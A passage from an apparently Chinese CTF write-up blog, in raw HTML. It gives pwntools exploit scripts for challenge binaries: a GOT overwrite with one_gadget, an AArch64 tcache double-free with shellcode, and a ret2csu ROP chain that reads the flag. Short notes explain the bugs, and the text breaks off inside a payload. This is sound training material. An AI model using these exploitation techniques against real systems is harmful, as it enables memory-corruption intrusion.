class="line"><span class="function"><span class="keyword">def</span> <span class="title">sla</span>(<span class="params">s, n</span>):</span> <span class="keyword">return</span> sh.sendlineafter(s, n)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span>(<span class="params">s</span>):</span> <span class="keyword">return</span> sh.sendline(s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span>(<span class="params">s</span>):</span> <span class="keyword">return</span> sh.send(s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc</span>(<span class="params">n</span>):</span> <span class="keyword">return</span> sh.recv(n)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span>(<span class="params">s</span>):</span> <span class="keyword">return</span> sh.recvuntil(s)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ti</span>():</span> <span class="keyword">return</span> sh.interactive()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">name, addr</span>):</span> <span class="keyword">return</span> log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_to</span>(<span class="params">addr, content</span>):</span></span><br><span class="line">    sd(<span class="built_in">str</span>(addr))</span><br><span class="line">    sa(<span class="string">&#x27;success&#x27;</span>, content)</span><br><span class="line">    sla(<span class="string">&#x27;bye&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    sla(<span class="string">&#x27;passwd:&#x27;</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    fread_got = <span class="number">0x412060</span></span><br><span class="line">    libc_base = <span class="number">0x400084a000</span></span><br><span class="line">    og = [<span class="number">0x3f150</span>, <span class="number">0x3f174</span>, <span class="number">0x3f198</span>, <span class="number">0x63e80</span>]</span><br><span class="line">    write_to(fread_got, p64(og[<span class="number">3</span>]+libc_base))</span><br><span class="line"></span><br><span class="line">pwn()</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br></pre></td></tr></table></figure><h4 id="ememarm"><a href="#ememarm" class="headerlink" title="ememarm"></a>ememarm</h4><p><img src="/2021/04/22/hws/Users\20766\AppData\Roaming\Typora\typora-user-images\image-20210422212601991.png" alt="image-20210422212601991"></p><p>!(C:\Users\20766\AppData\Roaming\Typora\typora-user-images\image-20210422203702651.png)</p><p><img src="/2021/04/22/hws/Users\20766\AppData\Roaming\Typora\typora-user-images\image-20210422203848683.png" alt="image-20210422203848683"></p><p>攻击chunk5[3]和chunk4[3]，edit之后会free chunk[3]指向的chunk，所以fake chunk被double free了</p><p><img src="/2021/04/22/hws/Users\20766\AppData\Roaming\Typora\typora-user-images\image-20210422213354259.png" alt="image-20210422213354259"></p><p>看不到bin好麻烦</p><p>tcachebin[0x30]-&gt;fakechunk-&gt;fakechunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;aarch64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./ememarm&#x27;</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line"><span class="comment"># libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;choice:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">cx,cy,num</span>):</span> <span class="comment">#size 0x30</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sa(<span class="string">&#x27;cx:&#x27;</span>,cx)</span><br><span class="line">    sa(<span class="string">&#x27;cy&#x27;</span>,cy)</span><br><span class="line">    sla(<span class="string">&#x27;delete?&#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">num,content</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(num))</span><br><span class="line">    sd(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span>(<span class="params">cx, cy, num</span>):</span> <span class="comment"># size 0x40</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sa(<span class="string">&#x27;cx:&#x27;</span>, cx)</span><br><span class="line">    sa(<span class="string">&#x27;cy&#x27;</span>, cy)</span><br><span class="line">    sla(<span class="string">&#x27;delete?&#x27;</span>, <span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;note  ~~&#x27;</span>)</span><br><span class="line">    bss = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">    leak(<span class="string">&#x27;bss&#x27;</span>,bss)</span><br><span class="line"></span><br><span class="line">    sl(<span class="string">&#x27;WENDY&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    add(<span class="string">&#x27;aaaa&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>)<span class="comment">#1</span></span><br><span class="line">    add(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;\x31&#x27;</span>, <span class="number">1</span>)<span class="comment">#3 fake size</span></span><br><span class="line">    add(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>)<span class="comment">#4</span></span><br><span class="line">    add(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>)<span class="comment">#5</span></span><br><span class="line">    gift(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>)<span class="comment">#6</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    edit(<span class="number">5</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    edit(<span class="number">4</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="comment"># tcachebin[0x30]-&gt;fakechunk-&gt;fakechunk</span></span><br><span class="line"></span><br><span class="line">    add(p64(bss+<span class="number">0x10</span>),p64(<span class="number">0</span>),<span class="number">0</span>) <span class="comment"># fakechunk</span></span><br><span class="line">    <span class="comment"># tcachebin[0x30] -&gt; fakechunk -&gt; bss+0x10</span></span><br><span class="line">    add(p64(<span class="number">0</span>),p64(bss+<span class="number">0x20</span>),<span class="number">0</span>) <span class="comment">#fakechunk chunk3[3]-&gt;bss+0x20</span></span><br><span class="line">    <span class="comment"># tcachebin[0x30]  -&gt; bss+0x10</span></span><br><span class="line"></span><br><span class="line">    sc1 = <span class="string">&quot;\xe1\x45\x8c\xd2\x21\xcd\xad\xf2&quot;</span></span><br><span class="line">    sc2 = <span class="string">&quot;\xe1\x65\xce\xf2\x01\x0d\xe0\xf2&quot;</span></span><br><span class="line">    sc3 = <span class="string">&quot;\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa&quot;</span></span><br><span class="line">    sc3+= <span class="string">&quot;\xe2\x03\x1f\xaa\xe0\x63\x21\x8b&quot;</span></span><br><span class="line">    sc3+= <span class="string">&quot;\xa8\x1b\x80\xd2\xe1\x66\x02\xd4&quot;</span></span><br><span class="line"></span><br><span class="line">    add(sc1,sc2,<span class="number">0</span>) <span class="comment"># bss+0x10</span></span><br><span class="line">    edit(<span class="number">4</span>,sc3) <span class="comment"># find chunk4 by chunk3[3] // so chunk4 == bss+0x20</span></span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># free --&gt; now chunk1-&gt;next=null</span></span><br><span class="line">    gift(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="number">1</span>) <span class="comment"># chunk_list1-&gt;next =this --&gt;index2</span></span><br><span class="line">    gift(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="number">1</span>) <span class="comment">#3</span></span><br><span class="line">    gift(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="number">1</span>)<span class="comment">#4</span></span><br><span class="line">    gift(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="number">1</span>)<span class="comment">#5</span></span><br><span class="line">    gift(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="number">1</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    edit(<span class="number">5</span>, <span class="string">&#x27;c&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    edit(<span class="number">4</span>, <span class="string">&#x27;c&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="comment"># tcachebin[0x40]-&gt;fakechunk-&gt;fakechunk</span></span><br><span class="line"></span><br><span class="line">    gift(p64(elf.got[<span class="string">&#x27;__isoc99_scanf&#x27;</span>]), p64(<span class="number">0</span>), <span class="number">0</span>)  <span class="comment"># fakechunk</span></span><br><span class="line">    <span class="comment"># tcachebin[0x30] -&gt; fakechunk -&gt; __isoc99_scanf@got</span></span><br><span class="line">    gift(p64(<span class="number">0</span>), p64(<span class="number">0</span>), <span class="number">0</span>)  <span class="comment"># fakechunk chunk3[3]-&gt;0</span></span><br><span class="line">    <span class="comment"># tcachebin[0x30]  -&gt; __isoc99_scanf@got</span></span><br><span class="line">    gift(p64(bss+<span class="number">0x10</span>), p64(bss+<span class="number">0x10</span>), <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    ti()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># sh = process(binary)</span></span><br><span class="line">    sh = process([<span class="string">&#x27;qemu-aarch64&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;./&#x27;</span>, <span class="string">&#x27;./ememarm&#x27;</span>])</span><br><span class="line">    <span class="comment"># sh = process([&#x27;qemu-aarch64&#x27;, &#x27;-L&#x27;, &#x27;./&#x27;, &#x27;-g&#x27;, &#x27;1247&#x27;, &#x27;./ememarm&#x27;])</span></span><br><span class="line">pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一晚上算是搞懂了，下班！</p><p><img src="/2021/04/22/hws/Users\20766\AppData\Roaming\Typora\typora-user-images\image-20210422221203902.png" alt="image-20210422221203902"></p><h5 id="justcode"><a href="#justcode" class="headerlink" title="justcode"></a>justcode</h5><p>case2中</p><p>scanf(“%d”,v1)</p><p>没有&amp;，会把栈地址上的内容作为地址，让我们写入</p><p>case1与case2被main调用，两个函数的栈是复用的，可以通过case1控制case2中v1的值，</p><p>一次任意地址写，</p><p>case1还可以溢出到canary触发stack check fail</p><p>因此可以改写__stack_chk_fail@got</p><p>这里改为ret(pop rip)，然后进入case2构造好栈内容（csu_rop）并溢出触发，控制执行流</p><p>选择改__stack_chk_fail@got是因为它还未被调用，真实地址没被写入，所以%d（4个字节）就可以完全覆盖</p><p>可以把flag字符串，和指向open地址的指针，写入到bss</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./justcode&#x27;</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(binary)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">case1</span>(<span class="params">buf</span>):</span></span><br><span class="line">    sa(<span class="string">&#x27;name&#x27;</span>,buf)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">case2</span>(<span class="params">v1,buf</span>):</span></span><br><span class="line">    sa(<span class="string">&#x27;id:&#x27;</span>,<span class="built_in">str</span>(v1))</span><br><span class="line">    sa(<span class="string">&#x27;info&#x27;</span>,buf)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;your code:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">case1(<span class="string">&#x27;a&#x27;</span>*<span class="number">0xc</span>+p64(elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># __stack_chk_fail@got -&gt; pop_r15_ret</span></span><br><span class="line">pop_r15_ret = <span class="number">0x0000000000400EA2</span></span><br><span class="line">case2(<span class="built_in">str</span>(pop_r15_ret)+<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;info&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># write payload and triger</span></span><br><span class="line">init1 = <span class="number">0x0000000000400E80</span></span><br><span class="line">init2 = <span class="number">0x0000000000400E96</span></span><br><span class="line">pay=flat([</span><br><span class="line">    init2,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    elf.got[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    elf.got[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">    init1</span><br><span class="line">])</span><br><span class="line">pay += flat([</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="comment"># 0x000000000400D4B # main</span></span><br><span class="line">    <span class="number">0x0000000000400C47</span> <span class="comment"># case1</span></span><br><span class="line">])</span><br><span class="line">pay=pay.ljust(<span class="number">0x90</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">case1(pay)</span><br><span class="line"></span><br><span class="line">libc_base = u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># write payload and triger</span></span><br><span class="line"><span class="comment"># read(0,flag_str,0x10)</span></span><br><span class="line">pay = flat([</span><br><span class="line">    init2,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    elf.got[<span class="string">&#x27;read&#x27;</span>], <span class="comment">#fun</span></span><br><span class="line">    <span class="number">0x10</span>, <span class="comment">#rdx</span></span><br><span class="line">    elf.bss()+<span class="number">0x200</span>, <span class="comment">#rsi</span></span><br><span class="line">    <span class="number">0</span>, <span class="comment">#rdi</span></span><br><span class="line">    init1</span><br><span class="line">])</span><br><span class="line">pay += flat([</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="comment"># 0x000000000400D4B # main</span></span><br><span class="line">    <span class="number">0x0000000000400C47</span>  <span class="comment"># case1</span></span><br><span class="line">])</span><br><span class="line">pay = pay.ljust(<span class="number">0x90</span>, <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">case1(pay)</span><br><span class="line">sh.recvline()</span><br><span class="line">sh.sendline(p64(libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>])+<span class="string">&#x27;flag\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># open(flag_str,0)</span></span><br><span class="line">pay = flat([</span><br><span class="line">    init2,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    elf.bss()+<span class="number">0x200</span>,  <span class="comment"># fun</span></span><br><span class="line">    <span class="number">0</span>,  <span class="comment"># rdx</span></span><br><span class="line">    <span class="number">0</span>,  <span class="comment"># rsi</span></span><br><span class="line">    elf.bss()+<span class="number">0x200</span>+<span class="number">0x8</span>,  <span class="comment"># rdi</span></span><br><span class="line">    init1</span><br><span class="line">])</span><br><span class="line">pay += flat([</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="comment"># 0x000000000400D4B # main</span></span><br><span class="line">    <span class="number">0x0000000000400C47</span>  <span class="comment"># case1</span></span><br><span class="line">])</span><br><span class="line">pay = pay.ljust(<span class="number">0x90</span>, <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">case1(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># read(3,flag_addr,0x50)</span></span><br><span class="line">pay = flat([</span><br><span class="line">    init2,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    elf.got[<span class="string">&#x27;read&#x27;</span>],  <span class="comment"># fun</span></span><br><span class="line">    <span class="number">0x50</span>,  <span class="comment"># rdx</span></span><br><span class="line">    elf.bss()+<span class="number">0x300</span>,  <span class="comment"># rsi</span></span><br><span class="line">    <span class="number">3</span>,  <span class="comment"># rdi</span></span><br><span class="line">    init1</span><br><span class="line">])</span><br><span class="line">pay += flat([</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="comment"># 0x000000000400D4B # main</span></span><br><span class="line">    <span class="number">0x0000000000400C47</span>  <span class="comment"># case1</span></span><br><span class="line">])</span><br><span class="line">pay = pay.ljust(<span class="number">0x90</span>, <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">case1(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># puts(flag_addr)</span></span><br><span class="line">pay = flat([</span><br><span class="line">    init2,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    elf.got[<span class="string">&#x27;puts&#x27;</span>],  <span class="comment"># fun</span></span><br><span class="line">    <span class="number">0</span>,  <span class="comment"># rdx</span></span><br><span class="line">    <span class="number">0</span>,  <span class="comment"># rsi</span></span><br><span class="line">    elf.bss()+<span class="number">0x300</span>,  <span class="comment"># rdi</span></span><br><span class="line">    init1</span><br><span class="line">])</span><br><span class="line">pay += flat([</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="comment"># 0x000000000400D4B # 